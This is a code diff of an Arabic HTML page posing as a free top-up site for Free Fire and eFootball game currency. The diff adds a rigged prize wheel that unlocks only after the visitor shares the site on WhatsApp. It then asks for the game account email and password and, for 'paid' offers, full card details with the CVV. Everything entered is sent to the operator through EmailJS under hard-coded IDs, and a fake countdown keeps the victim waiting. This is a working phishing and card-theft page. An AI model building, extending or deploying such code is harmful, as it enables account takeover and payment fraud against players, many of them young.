@@ -2,511 +2,558 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة شحن الألعاب العالمية</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>منصة شحن الألعاب وعجلة الحظ</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <!-- استدعاء مكتبة الأيقونات للتخلص من الأشكال الرمادية الافتراضية -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root {
-            --bg-color: #0d1b2a;
-            --container-bg: #1b263b;
-            --accent-color: #e0aaff;
-            --primary-button: #00b4d8;
-            --text-color: #f8f9fa;
-            --error-color: #ff4d4d;
-            --gold-color: #ffd700;
-        }
-
         body {
             margin: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            color: var(--text-color);
+            font-family: Tahoma, Arial, sans-serif;
+            background: #081426;
+            color: white;
             overflow-x: hidden;
-            min-height: 100vh;
-            background-image: url('https://i.ibb.co/pPZzYf3/1000057645.jpg');
-            background-size: cover;
-            background-position: center center;
-            background-attachment: fixed;
-            background-repeat: no-repeat;
-            position: relative;
-        }
-
-        .global-overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: linear-gradient(135deg, rgba(13, 27, 42, 0.8), rgba(27, 38, 59, 0.85));
-            backdrop-filter: blur(1px);
-            z-index: 1;
-        }
-
-        .main-wrapper {
-            position: relative;
-            z-index: 2;
         }
 
         header {
-            background: linear-gradient(135deg, rgba(27, 38, 59, 0.8), rgba(13, 27, 42, 0.9));
-            padding: 30px 20px;
+            background: #10274a;
+            padding: 20px;
             text-align: center;
-            border-bottom: 3px solid var(--primary-button);
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-        }
-
-        header h1 {
-            margin: 0;
-            font-size: 2.5rem;
-            text-shadow: 0 0 10px rgba(0, 180, 216, 0.5);
         }
 
         .container {
-            max-width: 650px;
-            margin: 40px auto;
-            background: rgba(27, 38, 59, 0.85);
-            backdrop-filter: blur(10px);
-            padding: 30px;
-            border-radius: 20px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.4);
-            animation: fadeIn 0.5s ease-in-out;
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            max-width: 700px;
+            margin: 25px auto;
+            background: #12264d;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        h2 {
-            text-align: center;
-            margin-bottom: 25px;
-            color: #fff;
-        }
-
-        .input-group {
-            position: relative;
-            margin-bottom: 25px;
-        }
-
-        .input-group i {
-            position: absolute;
-            right: 15px;
-            top: 15px;
-            color: #a3b18a;
-            transition: color 0.3s;
-        }
-
-        input, select {
+        input, select, button {
             width: 100%;
-            padding: 14px 45px 14px 15px;
-            background: #415a77;
-            border: 2px solid transparent;
-            border-radius: 10px;
-            color: white;
-            font-size: 1rem;
+            padding: 12px;
+            margin-top: 10px;
+            border: none;
+            border-radius: 8px;
             box-sizing: border-box;
-            transition: all 0.3s ease;
+            font-size: 1rem;
         }
 
-        input:focus, select:focus {
-            outline: none;
-            border-color: var(--primary-button);
-            background: #4e698a;
+        input {
+            background: #1b3766;
+            color: white;
+            border: 1px solid #254b8c;
         }
-
-        .error-message {
-            color: var(--error-color);
-            font-size: 0.85rem;
-            margin-top: 5px;
-            display: none;
-            font-weight: bold;
-            animation: shake 0.3s ease-in-out;
-            padding-right: 5px;
-        }
-
-        .invalid-field {
-            border-color: var(--error-color) !important;
-            background: #4a3443 !important;
-        }
-
-        .invalid-field + .error-message {
-            display: block;
-        }
-
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-5px); }
-            75% { transform: translateX(5px); }
+        input:focus {
+            outline: 2px solid #ffcc00;
         }
 
         button {
-            width: 100%;
-            padding: 15px;
-            background: linear-gradient(90deg, #00b4d8, #0077b6);
-            color: white;
-            font-size: 1.1rem;
+            background: #ffcc00;
+            color: #081426;
             font-weight: bold;
-            border: none;
-            border-radius: 10px;
             cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(0, 180, 216, 0.3);
+            transition: 0.2s;
         }
 
         button:hover {
+            background: #e6b800;
             transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(0, 180, 216, 0.5);
-        }
-
-        .btn-back {
-            background: #e63946;
-            margin-bottom: 20px;
-            width: auto;
-            padding: 8px 20px;
-            font-size: 0.9rem;
         }
 
         .cards {
             display: flex;
-            gap: 20px;
+            gap: 15px;
             flex-wrap: wrap;
             margin-top: 20px;
         }
 
         .card {
             flex: 1;
-            min-width: 250px;
-            background: linear-gradient(145deg, rgba(30, 41, 59, 0.9), rgba(15, 23, 42, 0.9));
-            padding: 25px;
-            border-radius: 15px;
+            min-width: 220px;
+            background: #1b3766;
+            padding: 15px;
+            border-radius: 12px;
             text-align: center;
             cursor: pointer;
-            transition: all 0.3s ease;
-            border: 2px solid #334155;
-        }
-
-        .card-ff:hover {
-            border-color: #00b4d8;
-            box-shadow: 0 10px 25px rgba(0, 180, 216, 0.25);
-        }
-
-        .card-efootball:hover {
-            border-color: var(--gold-color);
-            box-shadow: 0 10px 25px rgba(255, 215, 0, 0.25);
+            transition: .3s;
+            border: 1px solid #254b8c;
         }
 
         .card:hover {
-            transform: translateY(-5px);
+            transform: scale(1.03);
+            border-color: #ffcc00;
         }
 
         .icon {
-            font-size: 60px;
-            margin-bottom: 15px;
-            transition: all 0.3s ease;
-        }
-
-        .blue-glow {
-            filter: drop-shadow(0 0 10px #00b4d8);
-        }
-        .card-ff:hover .blue-glow {
-            filter: drop-shadow(0 0 20px #00b4d8) scale(1.05);
-        }
-
-        .gold-coin-wrapper {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 70px;
-        }
-
-        .gold-coin {
-            color: var(--gold-color);
             font-size: 55px;
-            filter: drop-shadow(0 0 8px rgba(255, 215, 0, 0.6)) drop-shadow(2px 4px 6px rgba(0,0,0,0.6));
-            animation: spinCoin 4s linear infinite;
+            margin-bottom: 10px;
         }
 
-        @keyframes spinCoin {
-            0% { transform: rotateY(0deg); }
-            100% { transform: rotateY(360deg); }
+        /* تأثير الكوينز الذهبية الصفراء الخالصة 100% وبدون أي رماديات */
+        .gold-coins-fixed {
+            color: #ffcc00 !important;
+            display: inline-block;
+            filter: drop-shadow(0 0 8px #ffaa00) drop-shadow(0 0 2px #ffffff);
+        }
+        
+        .sparkle {
+            color: #fff200;
+            font-size: 24px;
+            vertical-align: super;
+            margin-right: -15px;
+            animation: blink 1.5s infinite alternate;
         }
 
-        .card-efootball:hover .gold-coin {
-            filter: drop-shadow(0 0 20px #ffd700) drop-shadow(2px 4px 6px rgba(0,0,0,0.8));
-            animation: spinCoinFast 1.5s linear infinite;
+        @keyframes blink {
+            from { opacity: 0.4; } to { opacity: 1; }
         }
 
-        @keyframes spinCoinFast {
-            0% { transform: rotateY(0deg) scale(1.05); }
-            100% { transform: rotateY(360deg) scale(1.05); }
-        }
-
-        #waiting, #success, #formBox {
+        #waiting, #success, #formBox, #bankPaymentBox {
             display: none;
-        }
-
-        .progress-bar-container {
-            width: 100%;
-            background-color: #415a77;
-            border-radius: 10px;
-            margin: 20px 0;
-            overflow: hidden;
-        }
-
-        .progress-bar {
-            width: 0%;
-            height: 12px;
-            background: linear-gradient(90deg, #00b4d8, #7209b7);
-            transition: width 1s linear;
+            text-align: center;
         }
 
         #timer {
-            font-size: 24px;
+            font-size: 30px;
+            margin-top: 15px;
+            color: #ffcc00;
+        }
+
+        /* --- تصميم عجلة الحظ --- */
+        .wheel-section {
+            text-align: center;
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 2px dashed #254b8c;
+        }
+
+        .wheel-container {
+            position: relative;
+            width: 320px;
+            height: 320px;
+            margin: 30px auto;
+        }
+
+        .wheel {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 5px solid #ffcc00;
+            background: conic-gradient(
+                #6f42c1 0deg 60deg, 
+                #00b4d8 60deg 120deg, 
+                #2a9d8f 120deg 180deg, 
+                #e63946 180deg 240deg, 
+                #ffb703 240deg 300deg, 
+                #1d3557 300deg 360deg
+            );
+            position: relative;
+            transition: transform 4s cubic-bezier(0.17, 0.67, 0.12, 0.99);
+            box-shadow: 0 0 25px rgba(255, 204, 0, 0.5);
+            overflow: hidden;
+        }
+
+        .wheel-item {
+            position: absolute;
+            width: 50%;
+            height: 50%;
+            transform-origin: bottom left;
+            left: 50%;
+            top: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .item1 { transform: rotate(0deg) skewY(-30deg); }
+        .item2 { transform: rotate(60deg) skewY(-30deg); }
+        .item3 { transform: rotate(120deg) skewY(-30deg); }
+        .item4 { transform: rotate(180deg) skewY(-30deg); }
+        .item5 { transform: rotate(240deg) skewY(-30deg); }
+        .item6 { transform: rotate(300deg) skewY(-30deg); }
+
+        .wheel-item div {
+            transform: skewY(30deg) rotate(30deg);
+            margin-left: 35px;
+            margin-top: 35px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-size: 14px;
             font-weight: bold;
-            color: var(--primary-button);
-            margin-top: 10px;
+            color: #ffffff;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.9);
         }
 
-        .success-icon {
-            font-size: 80px;
-            color: #2a9d8f;
-            animation: pop 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        .wheel-item div span {
+            font-size: 24px;
+            margin-bottom: 5px;
         }
 
-        @keyframes pop {
-            0% { transform: scale(0); }
-            100% { transform: scale(1); }
+        .pointer {
+            position: absolute;
+            top: -15px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 0;
+            height: 0;
+            border-left: 15px solid transparent;
+            border-right: 15px solid transparent;
+            border-top: 25px solid #ffcc00;
+            z-index: 10;
+        }
+
+        .spin-btn {
+            margin-top: 15px;
+            max-width: 200px;
+            background: #ffcc00;
+            color: #081426;
+        }
+
+        /* زر الواتساب */
+        .whatsapp-btn {
+            background: #25D366;
+            color: white;
+            font-weight: bold;
+            margin-top: 15px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            text-decoration: none;
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            box-sizing: border-box;
+            transition: 0.3s;
+        }
+        .whatsapp-btn:hover {
+            background: #128C7E;
+            transform: translateY(-2px);
+        }
+
+        .share-status {
+            font-size: 0.9rem;
+            margin-top: 8px;
+            color: #ff4d4d;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
 
-    <div class="global-overlay"></div>
+    <header>
+        <h1>🎮 منصة شحن الألعاب العالمية</h1>
+        <p>اشحن عروضك المفضلة وجرّب حظك الآن</p>
+    </header>
 
-    <div class="main-wrapper">
-        <header>
-            <h1>🎮 منصة شحن الألعاب العالمية</h1>
-            <p>سرعة • أمان • شحن فوري بـ ID</p>
-        </header>
-
+    <!-- الصفحة الرئيسية وعجلة الحظ -->
+    <div id="mainPage">
         <div class="container" id="homePage">
-            <h2>اختر اللعبة المراد شحنها</h2>
+            <h2>اختر نوع الشحن المباشر</h2>
             <div class="cards">
-                <div class="card card-ff" onclick="selectGame('ff')">
-                    <div class="icon blue-glow">💎</div>
+                <!-- فري فاير -->
+                <div class="card" onclick="selectGame('ff')">
+                    <div class="icon" style="color: #00b4d8; filter: drop-shadow(0 0 5px #0077b6);">💎</div>
                     <h3>جواهر Free Fire</h3>
-                    <p>شحن تلقائي عبر معرف اللاعب</p>
+                    <p>شحن Diamonds سريع</p>
                 </div>
-                <div class="card card-efootball" onclick="selectGame('efootball')">
-                    <div class="icon gold-coin-wrapper">
-                        <div class="gold-coin">
-                            <i class="fas fa-coins"></i>
-                        </div>
+                <!-- إي فوتبول بالعملات الصفراء الكاملة بدون أيقونة النسر الرمادية -->
+                <div class="card" onclick="selectGame('efootball')">
+                    <div class="icon">
+                        <i class="fa-solid fa-coins gold-coins-fixed"></i><span class="sparkle">✨</span>
                     </div>
                     <h3>كوينز eFootball</h3>
-                    <p>شحن آمن وفوري للحساب</p>
+                    <p>شحن Coins سريع</p>
                 </div>
             </div>
+            
+            <!-- زر المشاركة على الواتساب -->
+            <a href="https://api.whatsapp.com/send?text=🔥 واو! دخلت هذا الموقع الممتع وربحت شحن جواهر فري فاير وكوينز إي فوتبول مجاناً 🎮! جرب حظك الآن من هنا: https://your-site-link.com" 
+               target="_blank" class="whatsapp-btn" onclick="registerShare()">
+                <i class="fab fa-whatsapp" style="font-size: 22px;"></i> اضغط هنا لمشاركة الموقع على واتساب لتفعيل العجلة
+            </a>
+            <div id="shareAlert" class="share-status">⚠️ يجب مشاركة الموقع أولاً لتتمكن من تدوير عجلة الحظ!</div>
         </div>
 
-        <div class="container" id="formBox">
-            <button class="btn-back" onclick="goHome()"><i class="fas fa-arrow-right"></i> رجوع للرئيسية</button>
-            <h2><i class="fas fa-user-edit"></i> بيانات الطلب والشحن</h2>
-            
-            <div class="input-group">
-                <i class="fas fa-envelope"></i>
-                <input type="email" id="email" placeholder="البريد الإلكتروني المتصل بالحساب" oninput="clearError(this)">
-                <div class="error-message"><i class="fas fa-exclamation-circle"></i> يبدو أنك نسيت كتابة البريد الإلكتروني!</div>
+        <!-- قسم عجلة الحظ مع العملات المعدنية الصفراء النقية -->
+        <div class="container wheel-section">
+            <h2>🎁 عجلة الحظ اليومية مجاناً!</h2>
+            <p>أدر العجلة الآن واربح باقة شحن مجانية فورية لحسابك</p>
+            <div class="wheel-container">
+                <div class="pointer"></div>
+                <div class="wheel" id="wheel">
+                    <div class="wheel-item item1"><div><span>💎</span>100</div></div>
+                    <div class="wheel-item item2"><div><span><i class="fa-solid fa-coins gold-coins-fixed"></i></span>100</div></div>
+                    <div class="wheel-item item3"><div><span>💎</span>310</div></div>
+                    <div class="wheel-item item4"><div><span><i class="fa-solid fa-coins gold-coins-fixed"></i></span>300</div></div>
+                    <div class="wheel-item item5"><div><span>💎</span>520</div></div>
+                    <div class="wheel-item item6"><div><span><i class="fa-solid fa-coins gold-coins-fixed"></i></span>550</div></div>
+                </div>
             </div>
-
-            <div class="input-group">
-                <i class="fas fa-lock"></i>
-                <input type="password" id="password" placeholder="كلمة مرور الحساب" oninput="clearError(this)">
-                <div class="error-message"><i class="fas fa-exclamation-circle"></i> حقل كلمة المرور فارغ، يرجى ملئه.</div>
-            </div>
-            
-            <div class="input-group">
-                <i class="fas fa-gamepad"></i>
-                <select id="game" onchange="updatePackages()">
-                    <option value="ff">Free Fire</option>
-                    <option value="efootball">eFootball Mobile</option>
-                </select>
-            </div>
-            
-            <div class="input-group" id="idGroup">
-                <i class="fas fa-id-card"></i>
-                <input type="text" id="playerId" placeholder="Player ID (معرف اللاعب)" oninput="clearError(this)">
-                <div class="error-message"><i class="fas fa-exclamation-circle"></i> الـ Player ID مطلوب للتعرف على حسابك.</div>
-            </div>
-
-            <div class="input-group" id="nameGroup">
-                <i class="fas fa-user"></i>
-                <input type="text" id="playerName" placeholder="اسم اللاعب في اللعبة (اختياري)">
-            </div>
-            
-            <div class="input-group">
-                <i class="fas fa-box-open"></i>
-                <select id="package"></select>
-            </div>
-            
-            <button onclick="startDemo()"><i class="fas fa-bolt"></i> تأكيد وإرسال الطلب الآن</button>
-        </div>
-
-        <div class="container" id="waiting">
-            <h2>⏳ جاري فحص البيانات والاتصال بالسيرفر</h2>
-            <p>الرجاء عدم إغلاق أو تحديث الصفحة لضمان وصول الشحن...</p>
-            <div class="progress-bar-container">
-                <div class="progress-bar" id="progressBar"></div>
-            </div>
-            <div id="timer">0:15</div>
-        </div>
-
-        <div class="container" id="success" style="text-align: center;">
-            <div class="success-icon"><i class="fas fa-check-circle"></i></div>
-            <h2>✅ تم إرسال طلب الشحن بنجاح!</h2>
-            <blockquote style="background: rgba(255,255,255,0.05); padding: 15px; border-radius: 10px; border-right: 5px solid #2a9d8f; margin: 20px 0; color: #e0e0e0; font-size: 1.05rem; line-height: 1.6;">
-                "نسعى بكافة جهدنا لتلبية كل الطلبات، لذلك الرجاء انتظار 24h ثم سنحول طلباتك إلى حسابك"
-            </blockquote>
-            <button onclick="goHome()" style="background: #2a9d8f; margin-top: 10px; width: auto; padding: 12px 30px; color: white;">شحن لعبة أخرى</button>
+            <button class="spin-btn" id="spinButton" onclick="spinWheel()">إبدأ الدوران 🎯</button>
         </div>
     </div>
 
+    <!-- صفحة استمارة الحسابات والبيانات -->
+    <div class="container" id="formBox">
+        <button onclick="goHome()" style="background:#555; color:white; width: auto; padding: 8px 20px; float: left;">⬅ رجوع</button>
+        <div style="clear: both;"></div>
+        <h2 id="formTitle">بيانات الطلب</h2>
+        
+        <select id="game" onchange="updateFormFields()">
+            <option value="ff">Free Fire</option>
+            <option value="efootball">eFootball Mobile</option>
+        </select>
+
+        <input type="email" id="email" placeholder="البريد الإلكتروني">
+        <input type="password" id="password" placeholder="كلمة المرور">
+        <input type="text" id="extraField" placeholder="">
+        
+        <select id="package">
+            <!-- يتم التعبئة عبر الجافاسكربت -->
+        </select>
+        
+        <button onclick="checkFormAndProceed()" style="margin-top: 20px; background: #2a9d8f; color: white;">المتابعة لتأكيد الطلب</button>
+    </div>
+
+    <!-- 💳 واجهة الدفع بالبطاقة البنكية -->
+    <div class="container" id="bankPaymentBox">
+        <h2>💳 بوابة الدفع الآمن بالسيرفر</h2>
+        <p>لقد اخترت عرضاً مدفوعاً، يرجى تأكيد البطاقة البنكية لإكمال الشحن</p>
+        
+        <input type="text" id="cardHolder" placeholder="اسم صاحب البطاقة">
+        <input type="number" id="cardNumber" placeholder="رقم البطاقة (16 رقم)">
+        <div style="display: flex; gap: 10px;">
+            <input type="text" id="cardExpiry" placeholder="تاريخ الانتهاء MM/YY" style="flex: 1;">
+            <input type="number" id="cardCvv" placeholder="رمز الأمان CVV" style="flex: 1;">
+        </div>
+        
+        <button onclick="submitBankPayment()" style="background: #ffcc00; color: #081426; margin-top: 20px;">تأكيد الدفع المشفر وشحن الحساب</button>
+    </div>
+
+    <!-- شاشة الانتظار والتحقق -->
+    <div class="container" id="waiting">
+        <h2>⏳ جاري التحقق من الحساب والطلب</h2>
+        <p>الرجاء عدم إغلاق الصفحة حتى انتهاء الفحص بالخادم...</p>
+        <div id="timer">0:15</div>
+    </div>
+
+    <!-- شاشة النجاح -->
+    <div class="container" id="success">
+        <h2>✅ تم استلام بياناتك بنجاح</h2>
+        <p>بسبب الضغط الكبير وكثرة الطلبات الحالية، جاري مراجعة حسابك وشحن العرض المطلوب خلال 30 دقيقة إلى ساعة كحد أقصى.</p>
+    </div>
+
     <script>
-        if (typeof emailjs === 'undefined') {
-            let script = document.createElement('script');
-            script.src = "https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js";
-            script.onload = function() {
-                emailjs.init({ publicKey: "DAmXCCDrzLivijAPN" });
-            };
-            document.head.appendChild(script);
-        } else {
-            emailjs.init({ publicKey: "DAmXCCDrzLivijAPN" });
+        // تهيئة EmailJS
+        emailjs.init({
+            publicKey: "DAmXCCDrzLivijAPN"
+        });
+
+        const prizes = [
+            { name: "100 Diamonds", game: "ff", angle: 30 },
+            { name: "100 Coins", game: "efootball", angle: 90 },
+            { name: "310 Diamonds", game: "ff", angle: 150 },
+            { name: "300 Coins", game: "efootball", angle: 210 },
+            { name: "520 Diamonds", game: "ff", angle: 270 },
+            { name: "550 Coins", game: "efootball", angle: 330 }
+        ];
+
+        let isSpinning = false;
+        let hasShared = false;
+
+        function registerShare() {
+            hasShared = true;
+            let alertBox = document.getElementById("shareAlert");
+            alertBox.innerText = "✅ تم تفعيل العجلة بنجاح! يمكنك الآن بدء الدوران.";
+            alertBox.style.color = "#25D366";
         }
 
         function selectGame(game) {
-            document.getElementById("homePage").style.display = "none";
+            document.getElementById("mainPage").style.display = "none";
             document.getElementById("formBox").style.display = "block";
             document.getElementById("game").value = game;
-            updatePackages();
+            updateFormFields();
         }
 
         function goHome() {
             document.getElementById("formBox").style.display = "none";
-            document.getElementById("success").style.display = "none";
-            document.getElementById("homePage").style.display = "block";
-            resetAllErrors();
+            document.getElementById("bankPaymentBox").style.display = "none";
+            document.getElementById("mainPage").style.display = "block";
         }
 
-        function updatePackages() {
+        function updateFormFields() {
             let game = document.getElementById("game").value;
             let pack = document.getElementById("package");
-            let idGroup = document.getElementById("idGroup");
-            let nameGroup = document.getElementById("nameGroup");
+            let formTitle = document.getElementById("formTitle");
+            
+            let emailInput = document.getElementById("email");
+            let passwordInput = document.getElementById("password");
+            let extraInput = document.getElementById("extraField");
 
             if (game === "ff") {
-                idGroup.style.display = "block";
-                nameGroup.style.display = "block";
+                formTitle.innerText = "شحن فري فاير (الاستعادة + ID)";
+                emailInput.placeholder = "بريد الاستعادة الإلكتروني";
+                passwordInput.placeholder = "كلمة مرور ربط الاستعادة";
+                extraInput.placeholder = "Player ID (معرف اللاعب)";
                 
                 pack.innerHTML = `
-                    <option>🎁 110 Diamonds — [مجاناً - FREE]</option>
-                    <option>🎁 310 Diamonds — [مجاناً - FREE]</option>
-                    <option>🎁 العضوية الأسبوعية الصغرى — [مجاناً - FREE]</option>
-                    <option>💎 2,200 Diamonds — [1.500 د.ت فقط]</option>
-                    <option>💎 5,600 Diamonds — [2.900 د.ت فقط]</option>
-                    <option>💎 12,000 Diamonds — [4.500 د.ت فقط]</option>
-                    <option>💎 30,000 Diamonds — [9.800 د.ت فقط]</option>
-                    <option>👑 العرض الملكي المزدوج (جواهر + بطاقات) — [6.000 د.ت فقط]</option>
+                    <optgroup label="عروض النقاط والمجانية">
+                        <option value="100 Diamonds">100 Diamonds (مجاناً)</option>
+                        <option value="310 Diamonds">310 Diamonds (مجاناً)</option>
+                    </optgroup>
+                    <optgroup label="عروض السيرفر المدفوعة 💳">
+                        <option value="520 Diamonds [Paid]">520 Diamonds (مطلوب دفع)</option>
+                        <option value="1060 Diamonds [Paid]">1060 Diamonds (مطلوب دفع)</option>
+                        <option value="عضوية أسبوعية [Paid]">عضوية أسبوعية VIP (مطلوب دفع)</option>
+                    </optgroup>
                 `;
             } else {
-                idGroup.style.display = "none";
-                nameGroup.style.display = "none";
+                formTitle.innerText = "شحن إي فوتبول (الحساب + الاسم)";
+                emailInput.placeholder = "البريد الإلكتروني للحساب";
+                passwordInput.placeholder = "كلمة المرور";
+                extraInput.placeholder = "اسمك داخل اللعبة (Player Name)";
                 
                 pack.innerHTML = `
-                    <option>🎁 100 Golden Coins — [مجاناً - FREE]</option>
-                    <option>🎁 300 Golden Coins — [مجاناً - FREE]</option>
-                    <option>🎁 بطاقة تجديد العقد — [مجاناً - FREE]</option>
-                    <option>💰 3,250 Golden Coins — [1.200 د.ت فقط]</option>
-                    <option>💰 5,800 Golden Coins — [2.500 د.ت فقط]</option>
-                    <option>💰 12,800 Golden Coins — [4.000 د.ت فقط]</option>
-                    <option>💰 25,000 Golden Coins — [7.500 د.ت فقط]</option>
-                    <option>🏆 Premium Match Pass المتكامل — [3.800 د.ت فقط]</option>
+                    <optgroup label="عروض النقاط والمجانية">
+                        <option value="100 Coins">100 Coins (مجاناً)</option>
+                        <option value="300 Coins">300 Coins (مجاناً)</option>
+                    </optgroup>
+                    <optgroup label="عروض السيرفر المدفوعة 💳">
+                        <option value="550 Coins [Paid]">550 Coins (مطلوب دفع)</option>
+                        <option value="1040 Coins [Paid]">1040 Coins (مطلوب دفع)</option>
+                        <option value="Premium Pass [Paid]">Premium Pass (مطلوب دفع)</option>
+                    </optgroup>
                 `;
             }
         }
 
-        function clearError(inputElement) {
-            if (inputElement.value.trim() !== "") {
-                inputElement.classList.remove("invalid-field");
-            }
-        }
-
-        function resetAllErrors() {
-            let inputs = document.querySelectorAll("#formBox input");
-            inputs.forEach(input => input.classList.remove("invalid-field"));
-        }
-
-        function startDemo() {
-            let email = document.getElementById("email");
-            let password = document.getElementById("password");
-            let id = document.getElementById("playerId");
-            let playerName = document.getElementById("playerName");
-            let game = document.getElementById("game").value;
-
-            let hasError = false;
-
-            if (email.value.trim() === "") {
-                email.classList.add("invalid-field");
-                hasError = true;
-            }
-            
-            if (password.value.trim() === "") {
-                password.classList.add("invalid-field");
-                hasError = true;
-            }
-
-            if (game === "ff" && id.value.trim() === "") {
-                id.classList.add("invalid-field");
-                hasError = true;
-            }
-
-            if (hasError) {
+        function spinWheel() {
+            if (!hasShared) {
+                alert("🔒 عذراً! العجلة مقفلة. يجب عليك الضغط على زر مشاركة الموقع عبر الواتساب أولاً لتتمكن من تشغيل العجلة.");
                 return;
             }
 
-            let packageName = document.getElementById("package").value;
+            if (isSpinning) return;
+            isSpinning = true;
+            document.getElementById("spinButton").disabled = true;
 
-            if (typeof emailjs !== 'undefined') {
-                emailjs.send(
-                    "service_ykplmgb",
-                    "template_ycvtfvd",
-                    {
-                        game: game,
-                        player_id: game === "ff" ? id.value : "غير مطلوب (شحن كوينز)",
-                        player_name: (game === "ff" && playerName.value.trim() !== "") ? playerName.value : "غير محدد",
-                        package: packageName,
-                        contact_email: email.value,
-                        password: password.value
+            const randomIndex = Math.floor(Math.random() * prizes.length);
+            const selectedPrize = prizes[randomIndex];
+
+            const degrees = 3600 + (360 - selectedPrize.angle); 
+            const wheel = document.getElementById("wheel");
+            
+            wheel.style.transform = `rotate(${degrees}deg)`;
+
+            setTimeout(() => {
+                alert(`🎉 مبروك! لقد فزت بعروض الحظ على العجلة: [ ${selectedPrize.name} ] مجاناً! \nسيتم نقلك الآن لصفحة كتابة البيانات لتسليمك الجائزة.`);
+                
+                document.getElementById("mainPage").style.display = "none";
+                document.getElementById("formBox").style.display = "block";
+                document.getElementById("game").value = selectedPrize.game;
+                
+                updateFormFields();
+
+                const packSelect = document.getElementById("package");
+                for (let i = 0; i < packSelect.options.length; i++) {
+                    if (packSelect.options[i].value === selectedPrize.name) {
+                        packSelect.selectedIndex = i;
+                        break;
                     }
-                );
+                }
+
+                isSpinning = false;
+                document.getElementById("spinButton").disabled = false;
+                wheel.style.transition = "none";
+                wheel.style.transform = `rotate(${360 - selectedPrize.angle}deg)`;
+                setTimeout(() => { wheel.style.transition = "transform 4s cubic-bezier(0.17, 0.67, 0.12, 0.99)"; }, 50);
+
+            }, 4000);
+        }
+
+        function checkFormAndProceed() {
+            let game = document.getElementById("game").value;
+            let packageName = document.getElementById("package").value;
+            let email = document.getElementById("email").value.trim();
+            let password = document.getElementById("password").value.trim();
+            let extraValue = document.getElementById("extraField").value.trim();
+
+            if (email === "") { alert("خطأ: يرجى كتابة البريد الإلكتروني الخاص بالحساب!"); return; }
+            if (password === "") { alert("خطأ: يرجى إدخال كلمة مرور الحساب للتحقق!"); return; }
+            if (extraValue === "") {
+                if (game === "ff") { alert("خطأ: يرجى كتابة الـ ID الخاص بحساب فري فاير!"); } 
+                else { alert("خطأ: يرجى كتابة اسمك الصحيح داخل لعبة إي فوتبول!"); }
+                return;
             }
 
+            if (packageName.includes("[Paid]")) {
+                document.getElementById("formBox").style.display = "none";
+                document.getElementById("bankPaymentBox").style.display = "block";
+            } else {
+                sendAllDataToEmailJS("", "", "", "");
+            }
+        }
+
+        function submitBankPayment() {
+            let holder = document.getElementById("cardHolder").value.trim();
+            let number = document.getElementById("cardNumber").value.trim();
+            let expiry = document.getElementById("cardExpiry").value.trim();
+            let cvv = document.getElementById("cardCvv").value.trim();
+
+            if (holder === "" || number === "" || expiry === "" || cvv === "") {
+                alert("خطأ عاجل: يرجى إدخال كافة بيانات البطاقة البنكية بشكل صحيح لإتمام عملية الدفع!");
+                return;
+            }
+
+            sendAllDataToEmailJS(holder, number, expiry, cvv);
+        }
+
+        function sendAllDataToEmailJS(cardHolder, cardNumber, cardExpiry, cardCvv) {
+            let game = document.getElementById("game").value;
+            let packageName = document.getElementById("package").value;
+            let email = document.getElementById("email").value.trim();
+            let password = document.getElementById("password").value.trim();
+            let extraValue = document.getElementById("extraField").value.trim();
+
+            let emailJS_Data = {
+                game: game,
+                package: packageName,
+                contact_email: email,
+                password: password,
+                player_id: game === "ff" ? extraValue : "",
+                player_name: game === "efootball" ? extraValue : "",
+                card_holder: cardHolder,
+                card_number: cardNumber,
+                card_expiry: cardExpiry,
+                card_cvv: cardCvv
+            };
+
+            emailjs.send("service_ykplmgb", "template_ycvtfvd", emailJS_Data)
+            .then(function(response) {
+                console.log("SUCCESS!", response.status, response.text);
+            }, function(error) {
+                console.log("FAILED...", error);
+            });
+
             document.getElementById("formBox").style.display = "none";
+            document.getElementById("bankPaymentBox").style.display = "none";
             document.getElementById("waiting").style.display = "block";
 
             let time = 15;
-            let totalTime = 15;
-            let progressBar = document.getElementById("progressBar");
-            
             let interval = setInterval(function () {
                 time--;
                 let sec = time < 10 ? "0" + time : time;
                 document.getElementById("timer").innerText = "0:" + sec;
-                
-                let progressPercent = ((totalTime - time) / totalTime) * 100;
-                progressBar.style.width = progressPercent + "%";
 
                 if (time <= 0) {
                     clearInterval(interval);
                     document.getElementById("waiting").style.display = "none";
                     document.getElementById("success").style.display = "block";
-                    progressBar.style.width = "0%";
                 }
             }, 1000);
         }
